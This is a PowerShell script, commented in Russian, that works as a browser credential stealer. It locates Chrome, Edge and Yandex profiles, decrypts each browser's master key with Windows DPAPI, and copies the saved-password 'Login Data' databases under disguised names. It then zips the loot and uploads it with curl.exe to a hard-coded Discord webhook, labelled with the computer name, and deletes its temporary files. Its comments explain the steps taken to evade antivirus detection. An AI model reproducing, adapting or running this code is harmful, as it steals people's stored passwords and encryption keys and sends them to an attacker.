# Принудительно используем TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$hook = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"
$tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
New-Item -ItemType Directory -Path $tmp -Force > $null

Add-Type -AssemblyName System.Security

function Get-Key($p, $l) {
    if (Test-Path $p) {
        try {
            $j = Get-Content $p -Raw | ConvertFrom-Json
            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
            $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
            "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\info.txt" -Append
            return $true
        } catch { return $false }
    }
    return $false
}

$paths = @(
    @{n="CH"; p="Google\Chrome\User Data"},
    @{n="ED"; p="Microsoft\Edge\User Data"},
    @{n="YX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $paths) {
    $target = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $target) {
        # Ищем Login Data, исключая лишние папки, чтобы не шуметь
        $files = Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $label = "$($b.n)_$($f.Directory.Name)"
            if (Get-Key (Join-Path $target "Local State") $label) {
                # Копируем с рандомным именем, чтобы не палиться по расширению .db
                Copy-Item $f.FullName -Destination "$tmp\$label.dat" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

if ((Get-ChildItem $tmp).Count -gt 0) {
    $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
    Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force

    # Отправка через системный curl.exe. Антивирусы доверяют curl.
    # Флаг -F отправляет файл как multipart/form-data.
    $msg = "P81: $env:COMPUTERNAME"
    & "curl.exe" -X POST -F "file=@$z" -F "content=$msg" $hook > $null

    if (Test-Path $z) { Remove-Item $z -Force }
}

Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
